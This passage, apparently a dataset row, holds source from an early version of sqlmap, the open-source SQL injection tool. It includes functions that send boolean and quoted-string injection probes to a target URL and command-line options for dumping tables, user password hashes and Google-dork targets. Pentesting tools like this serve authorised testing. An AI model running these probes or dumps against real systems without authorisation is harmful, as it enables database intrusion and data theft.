,Unnamed: 0,id,code,label
                #if (request.has_header('Content-Type') and request.get_header('Content-Type').find('multipart/form-data') != 0):
                #    print ""Replacing %s with %s"" % (request.get_header('content-type'), 'multipart/form-data')
                request.add_unredirected_header('Content-Type', contenttype)

            request.add_data(data)
        return request


    def multipart_encode(vars, files, boundary = None, buffer = None):
        if boundary is None:
            boundary = mimetools.choose_boundary()
        if buffer is None:
            buffer = ''
        for(key, value) in vars:
            buffer += '--%s\r\n' % boundary
            buffer += 'Content-Disposition: form-data; name=""%s""' % key
            buffer += '\r\n\r\n' + value + '\r\n'
        for(key, fd) in files:
            file_size = os.fstat(fd.fileno())[stat.ST_SIZE]
            filename = fd.name.split('/')[-1]
            contenttype = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
            buffer += '--%s\r\n' % boundary
            buffer += 'Content-Disposition: form-data; name=""%s""; filename=""%s""\r\n' % (key, filename)
            buffer += 'Content-Type: %s\r\n' % contenttype
            # buffer += 'Content-Length: %s\r\n' % file_size
            fd.seek(0)
            buffer += '\r\n' + fd.read() + '\r\n'
        buffer += '--%s--\r\n\r\n' % boundary
        return boundary, buffer
    multipart_encode = Callable(multipart_encode)

    https_request = http_request

/n/n/nlib/controller/checks.py/n/n#!/usr/bin/env python

""""""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
""""""



import re
import time

from lib.controller.action import action
from lib.core.agent import agent
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapConnectionException
from lib.core.session import setString
from lib.core.session import setRegexp
from lib.request.connect import Connect as Request


def checkSqlInjection(place, parameter, value, parenthesis):
    """"""
    This function checks if the GET, POST, Cookie, User-Agent
    parameters are affected by a SQL injection vulnerability and
    identifies the type of SQL injection:

      * Unescaped numeric injection
      * Single quoted string injection
      * Double quoted string injection
    """"""

    randInt = randomInt()
    randStr = randomStr()

    if conf.prefix or conf.postfix:
        prefix  = """"
        postfix = """"

        if conf.prefix:
            prefix = conf.prefix

        if conf.postfix:
            postfix = conf.postfix

        infoMsg  = ""testing custom injection ""
        infoMsg += ""on %s parameter '%s'"" % (place, parameter)
        logger.info(infoMsg)

        payload = agent.payload(place, parameter, value, ""%s%s%s AND %s%d=%d %s"" % (value, prefix, "")"" * parenthesis, ""("" * parenthesis, randInt, randInt, postfix))
        trueResult = Request.queryPage(payload, place)

        if trueResult == True:
            payload = agent.payload(place, parameter, value, ""%s%s%s AND %s%d=%d %s"" % (value, prefix, "")"" * parenthesis, ""("" * parenthesis, randInt, randInt + 1, postfix))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = ""confirming custom injection ""
                infoMsg += ""on %s parameter '%s'"" % (place, parameter)
                logger.info(infoMsg)

                payload = agent.payload(place, parameter, value, ""%s%s%s AND %s%s %s"" % (value, prefix, "")"" * parenthesis, ""("" * parenthesis, randStr, postfix))
                falseResult = Request.queryPage(payload, place)

                if falseResult != True:
                    infoMsg  = ""%s parameter '%s' is "" % (place, parameter)
                    infoMsg += ""custom injectable ""
                    logger.info(infoMsg)

                    return ""custom""

    infoMsg  = ""testing unescaped numeric injection ""
    infoMsg += ""on %s parameter '%s'"" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, ""%s%s AND %s%d=%d"" % (value, "")"" * parenthesis, ""("" * parenthesis, randInt, randInt))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, ""%s%s AND %s%d=%d"" % (value, "")"" * parenthesis, ""("" * parenthesis, randInt, randInt + 1))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = ""confirming unescaped numeric injection ""
            infoMsg += ""on %s parameter '%s'"" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, ""%s%s AND %s%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = ""%s parameter '%s' is "" % (place, parameter)
                infoMsg += ""unescaped numeric injectable ""
                infoMsg += ""with %d parenthesis"" % parenthesis
                logger.info(infoMsg)

                return ""numeric""

    infoMsg  = ""%s parameter '%s' is not "" % (place, parameter)
    infoMsg += ""unescaped numeric injectable""
    logger.info(infoMsg)

    infoMsg  = ""testing single quoted string injection ""
    infoMsg += ""on %s parameter '%s'"" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, ""%s'%s AND %s'%s'='%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, ""%s'%s AND %s'%s'='%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = ""confirming single quoted string injection ""
            infoMsg += ""on %s parameter '%s'"" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, ""%s'%s and %s%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = ""%s parameter '%s' is "" % (place, parameter)
                infoMsg += ""single quoted string injectable ""
                infoMsg += ""with %d parenthesis"" % parenthesis
                logger.info(infoMsg)

                return ""stringsingle""

    infoMsg  = ""%s parameter '%s' is not "" % (place, parameter)
    infoMsg += ""single quoted string injectable""
    logger.info(infoMsg)

    infoMsg  = ""testing LIKE single quoted string injection ""
    infoMsg += ""on %s parameter '%s'"" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, ""%s'%s AND %s'%s' LIKE '%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, ""%s'%s AND %s'%s' LIKE '%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = ""confirming LIKE single quoted string injection ""
            infoMsg += ""on %s parameter '%s'"" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, ""%s'%s and %s%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = ""%s parameter '%s' is "" % (place, parameter)
                infoMsg += ""LIKE single quoted string injectable ""
                infoMsg += ""with %d parenthesis"" % parenthesis
                logger.info(infoMsg)

                return ""likesingle""

    infoMsg  = ""%s parameter '%s' is not "" % (place, parameter)
    infoMsg += ""LIKE single quoted string injectable""
    logger.info(infoMsg)

    infoMsg  = ""testing double quoted string injection ""
    infoMsg += ""on %s parameter '%s'"" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, ""%s\""%s AND %s\""%s\""=\""%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, ""%s\""%s AND %s\""%s\""=\""%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = ""confirming double quoted string injection ""
            infoMsg += ""on %s parameter '%s'"" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, ""%s\""%s AND %s%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = ""%s parameter '%s' is "" % (place, parameter)
                infoMsg += ""double quoted string injectable ""
                infoMsg += ""with %d parenthesis"" % parenthesis
                logger.info(infoMsg)

                return ""stringdouble""

    infoMsg  = ""%s parameter '%s' is not "" % (place, parameter)
    infoMsg += ""double quoted string injectable""
    logger.info(infoMsg)

    infoMsg  = ""testing LIKE double quoted string injection ""
    infoMsg += ""on %s parameter '%s'"" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, ""%s\""%s AND %s\""%s\"" LIKE \""%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr))
    trueResult = Request.queryPage(payload, place)

    if trueResult == True:
        payload = agent.payload(place, parameter, value, ""%s\""%s AND %s\""%s\"" LIKE \""%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr, randStr + randomStr(1)))
        falseResult = Request.queryPage(payload, place)

        if falseResult != True:
            infoMsg  = ""confirming LIKE double quoted string injection ""
            infoMsg += ""on %s parameter '%s'"" % (place, parameter)
            logger.info(infoMsg)

            payload = agent.payload(place, parameter, value, ""%s\""%s and %s%s"" % (value, "")"" * parenthesis, ""("" * parenthesis, randStr))
            falseResult = Request.queryPage(payload, place)

            if falseResult != True:
                infoMsg  = ""%s parameter '%s' is "" % (place, parameter)
                infoMsg += ""LIKE double quoted string injectable ""
                infoMsg += ""with %d parenthesis"" % parenthesis
                logger.info(infoMsg)

                return ""likedouble""

    infoMsg  = ""%s parameter '%s' is not "" % (place, parameter)
    infoMsg += ""LIKE double quoted string injectable""
    logger.info(infoMsg)

    return None


def checkDynParam(place, parameter, value):
    """"""
    This function checks if the url parameter is dynamic. If it is
    dynamic, the content of the page differs, otherwise the
    dynamicity might depend on another parameter.
    """"""

    infoMsg = ""testing if %s parameter '%s' is dynamic"" % (place, parameter)
    logger.info(infoMsg)

    randInt = randomInt()
    payload = agent.payload(place, parameter, value, str(randInt))
    dynResult1 = Request.queryPage(payload, place)

    if True == dynResult1:
        return False

    infoMsg = ""confirming that %s parameter '%s' is dynamic"" % (place, parameter)
    logger.info(infoMsg)

    payload = agent.payload(place, parameter, value, ""'%s"" % randomStr())
    dynResult2 = Request.queryPage(payload, place)

    payload = agent.payload(place, parameter, value, ""\""%s"" % randomStr())
    dynResult3 = Request.queryPage(payload, place)

    condition  = True != dynResult2
    condition |= True != dynResult3

    return condition


def checkStability():
    """"""
    This function checks if the URL content is stable requesting the
    same page three times with a small delay within each request to
    assume that it is stable.

    In case the content of the page differs when requesting
    the same page, the dynamicity might depend on other parameters,
    like for instance string matching (--string).
    """"""

    infoMsg = ""testing if the url is stable, wait a few seconds""
    logger.info(infoMsg)

    firstPage, firstHeaders = Request.queryPage(content=True)
    time.sleep(1)

    secondPage, secondHeaders = Request.queryPage(content=True)
    time.sleep(0.5)

    condition = firstPage == secondPage

    if condition == False:
        warnMsg  = ""url is not stable, sqlmap will base the page ""
        warnMsg += ""comparison on a sequence matcher, if no dynamic nor ""
        warnMsg += ""injectable parameters are detected, refer to user's ""
        warnMsg += ""manual paragraph 'Page comparison' and provide a ""
        warnMsg += ""string or regular expression to match on""
        logger.warn(warnMsg)

    if condition == True:
        logMsg = ""url is stable""
        logger.info(logMsg)

    return condition


def checkString():
    if not conf.string:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key(""String"") and
                  kb.resumedQueries[conf.url][""String""][:-1] == conf.string
                )

    if condition:
        return True

    infoMsg  = ""testing if the provided string is within the ""
    infoMsg += ""target URL page content""
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if conf.string in page:
        setString()
        return True
    else:
        errMsg  = ""you provided '%s' as the string to "" % conf.string
        errMsg += ""match, but such a string is not within the target ""
        errMsg += ""URL page content, please provide another string.""
        logger.error(errMsg)

        return False


def checkRegexp():
    if not conf.regexp:
        return True

    condition = (
                  kb.resumedQueries.has_key(conf.url) and
                  kb.resumedQueries[conf.url].has_key(""Regular expression"") and
                  kb.resumedQueries[conf.url][""Regular expression""][:-1] == conf.regexp
                )

    if condition:
        return True

    infoMsg  = ""testing if the provided regular expression matches within ""
    infoMsg += ""the target URL page content""
    logger.info(infoMsg)

    page, _ = Request.queryPage(content=True)

    if re.search(conf.regexp, page, re.I | re.M):
        setRegexp()
        return True
    else:
        errMsg  = ""you provided '%s' as the regular expression to "" % conf.regexp
        errMsg += ""match, but such a regular expression does not have any ""
        errMsg += ""match within the target URL page content, please provide ""
        errMsg += ""another regular expression.""
        logger.error(errMsg)

        return False


def checkConnection():
    infoMsg = ""testing connection to the target url""
    logger.info(infoMsg)

    try:
        page, _ = Request.getPage()
        conf.seqMatcher.set_seq1(page)

    except sqlmapConnectionException, exceptionMsg:
        if conf.multipleTargets:
            exceptionMsg += "", skipping to next url""
            logger.warn(exceptionMsg)

            return False
        else:
            raise sqlmapConnectionException, exceptionMsg

    return True
/n/n/nlib/parse/cmdline.py/n/n#!/usr/bin/env python

""""""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
""""""



import sys

from optparse import OptionError
from optparse import OptionGroup
from optparse import OptionParser

from lib.core.data import logger
from lib.core.settings import VERSION_STRING


def cmdLineParser():
    """"""
    This function parses the command line parameters and arguments
    """"""

    usage = ""%s [options]"" % sys.argv[0]
    parser = OptionParser(usage=usage, version=VERSION_STRING)

    try:
        parser.add_option(""-v"", dest=""verbose"", type=""int"",
                          help=""Verbosity level: 0-5 (default 1)"")

        # Target options
        target = OptionGroup(parser, ""Target"", ""At least one of these ""
                             ""options has to be specified to set the source ""
                             ""to get target urls from."")

        target.add_option(""-u"", ""--url"", dest=""url"", help=""Target url"")

        target.add_option(""-l"", dest=""list"", help=""Parse targets from Burp ""
                          ""or WebScarab logs"")

        target.add_option(""-g"", dest=""googleDork"",
                          help=""Process Google dork results as target urls"")

        target.add_option(""-c"", dest=""configFile"",
                          help=""Load options from a configuration INI file"")


        # Request options
        request = OptionGroup(parser, ""Request"", ""These options can be used ""
                              ""to specify how to connect to the target url."")

        request.add_option(""--method"", dest=""method"", default=""GET"",
                           help=""HTTP method, GET or POST (default: GET)"")

        request.add_option(""--data"", dest=""data"",
                           help=""Data string to be sent through POST"")

        request.add_option(""--cookie"", dest=""cookie"",
                           help=""HTTP Cookie header"")

        request.add_option(""--referer"", dest=""referer"",
                           help=""HTTP Referer header"")

        request.add_option(""--user-agent"", dest=""agent"",
                           help=""HTTP User-Agent header"")

        request.add_option(""-a"", dest=""userAgentsFile"",
                           help=""Load a random HTTP User-Agent ""
                                ""header from file"")

        request.add_option(""--headers"", dest=""headers"",
                           help=""Extra HTTP headers '\\n' separated"")

        request.add_option(""--auth-type"", dest=""aType"",
                           help=""HTTP Authentication type, value: ""
                                ""Basic or Digest"")

        request.add_option(""--auth-cred"", dest=""aCred"",
                           help=""HTTP Authentication credentials, value: ""
                                ""name:password"")

        request.add_option(""--proxy"", dest=""proxy"",
                           help=""Use a HTTP proxy to connect to the target url"")

        request.add_option(""--threads"", dest=""threads"", type=""int"",
                           help=""Maximum number of concurrent HTTP ""
                                ""requests (default 1)"")

        request.add_option(""--delay"", dest=""delay"", type=""float"",
                           help=""Delay in seconds between each HTTP request"")

        request.add_option(""--timeout"", dest=""timeout"", type=""float"",
                           help=""Seconds to wait before timeout connection ""
                                ""(default 30)"")


        # Injection options
        injection = OptionGroup(parser, ""Injection"", ""These options can be ""
                                ""used to specify which parameters to test ""
                                ""for, provide custom injection payloads and ""
                                ""how to parse and compare HTTP responses ""
                                ""page content when using the blind SQL ""
                                ""injection technique."")

        injection.add_option(""-p"", dest=""testParameter"",
                             help=""Testable parameter(s)"")

        injection.add_option(""--dbms"", dest=""dbms"",
                             help=""Force back-end DBMS to this value"")

        injection.add_option(""--prefix"", dest=""prefix"",
                             help=""Injection payload prefix string"")

        injection.add_option(""--postfix"", dest=""postfix"",
                             help=""Injection payload postfix string"")

        injection.add_option(""--string"", dest=""string"",
                             help=""String to match in page when the ""
                                  ""query is valid"")

        injection.add_option(""--regexp"", dest=""regexp"",
                             help=""Regexp to match in page when the ""
                                  ""query is valid"")

        injection.add_option(""--excl-str"", dest=""eString"",
                             help=""String to be excluded before calculating ""
                                  ""page hash"")

        injection.add_option(""--excl-reg"", dest=""eRegexp"",
                             help=""Regexp matches to be excluded before ""
                                  ""calculating page hash"")


        # Techniques options
        techniques = OptionGroup(parser, ""Techniques"", ""These options can ""
                                 ""be used to test for specific SQL injection ""
                                 ""technique or to use one of them to exploit ""
                                 ""the affected parameter(s) rather than using ""
                                 ""the default blind SQL injection technique."")

        techniques.add_option(""--stacked-test"", dest=""stackedTest"",
                              action=""store_true"",
                              help=""Test for stacked queries (multiple ""
                                   ""statements) support"")

        techniques.add_option(""--time-test"", dest=""timeTest"",
                              action=""store_true"",
                              help=""Test for Time based blind SQL injection"")

        techniques.add_option(""--union-test"", dest=""unionTest"",
                              action=""store_true"",
                              help=""Test for UNION query (inband) SQL injection"")

        techniques.add_option(""--union-use"", dest=""unionUse"",
                              action=""store_true"",
                              help=""Use the UNION query (inband) SQL injection ""
                                   ""to retrieve the queries output. No ""
                                   ""need to go blind"")


        # Fingerprint options
        fingerprint = OptionGroup(parser, ""Fingerprint"")

        fingerprint.add_option(""-f"", ""--fingerprint"", dest=""extensiveFp"",
                               action=""store_true"",
                               help=""Perform an extensive DBMS version fingerprint"")


        # Enumeration options
        enumeration = OptionGroup(parser, ""Enumeration"", ""These options can ""
                                  ""be used to enumerate the back-end database ""
                                  ""management system information, structure ""
                                  ""and data contained in the tables. Moreover ""
                                  ""you can run your own SQL statements."")

        enumeration.add_option(""-b"", ""--banner"", dest=""getBanner"",
                               action=""store_true"", help=""Retrieve DBMS banner"")

        enumeration.add_option(""--current-user"", dest=""getCurrentUser"",
                               action=""store_true"",
                               help=""Retrieve DBMS current user"")

        enumeration.add_option(""--current-db"", dest=""getCurrentDb"",
                               action=""store_true"",
                               help=""Retrieve DBMS current database"")

        enumeration.add_option(""--is-dba"", dest=""isDba"",
                               action=""store_true"",
                               help=""Detect if the DBMS current user is DBA"")

        enumeration.add_option(""--users"", dest=""getUsers"", action=""store_true"",
                               help=""Enumerate DBMS users"")

        enumeration.add_option(""--passwords"", dest=""getPasswordHashes"",
                               action=""store_true"",
                               help=""Enumerate DBMS users password hashes (opt: -U)"")

        enumeration.add_option(""--privileges"", dest=""getPrivileges"",
                               action=""store_true"",
                               help=""Enumerate DBMS users privileges (opt: -U)"")

        enumeration.add_option(""--dbs"", dest=""getDbs"", action=""store_true"",
                               help=""Enumerate DBMS databases"")

        enumeration.add_option(""--tables"", dest=""getTables"", action=""store_true"",
                               help=""Enumerate DBMS database tables (opt: -D)"")

        enumeration.add_option(""--columns"", dest=""getColumns"", action=""store_true"",
                               help=""Enumerate DBMS database table columns ""
                                    ""(req:-T opt:-D)"")

        enumeration.add_option(""--dump"", dest=""dumpTable"", action=""store_true"",
                               help=""Dump DBMS database table entries ""
                                    ""(req: -T, opt: -D, -C, --start, --stop)"")

        enumeration.add_option(""--dump-all"", dest=""dumpAll"", action=""store_true"",
                               help=""Dump all DBMS databases tables entries"")

        enumeration.add_option(""-D"", dest=""db"",
                               help=""DBMS database to enumerate"")

        enumeration.add_option(""-T"", dest=""tbl"",
                               help=""DBMS database table to enumerate"")

        enumeration.add_option(""-C"", dest=""col"",
                               help=""DBMS database table column to enumerate"")

        enumeration.add_option(""-U"", dest=""user"",
                               help=""DBMS user to enumerate"")

        enumeration.add_option(""--exclude-sysdbs"", dest=""excludeSysDbs"",
                               action=""store_true"",
                               help=""Exclude DBMS system databases when ""
                                    ""enumerating tables"")

        enumeration.add_option(""--start"", dest=""limitStart"", type=""int"",
                               help=""First table entry to dump"")

